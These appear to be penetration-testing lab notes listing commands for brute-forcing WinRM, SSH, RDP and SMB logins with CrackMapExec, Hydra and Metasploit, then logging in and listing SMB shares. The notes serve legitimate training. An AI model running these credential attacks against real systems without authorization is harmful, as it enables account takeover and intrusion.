# WinRM
## CrackMapExec Usage
```
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```
crackmapexec winrm <ip> -u <userlist> -p <passwordlist>
```
The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.
```
evil-winrm -i <target-IP> -u <username> -p <password>
```
# SSH
## Hydra - SSH
```
hydra -L user.list -P password.list ssh://10.129.42.197
```
```
ssh user@<ip>
```
# Remote Desktop Protocol (RDP)
## Hydra - RDP
```
hydra -L user.list -P password.list rdp://10.129.42.197
```
```
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
# SMB
## Hydra - SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```
## Hydra - Error
### Metasploit Framework
```
use auxiliary/scanner/smb/smb_login
```
Now we can use CrackMapExec again to view the available shares and what privileges we have for them.
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
### Smbclient
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

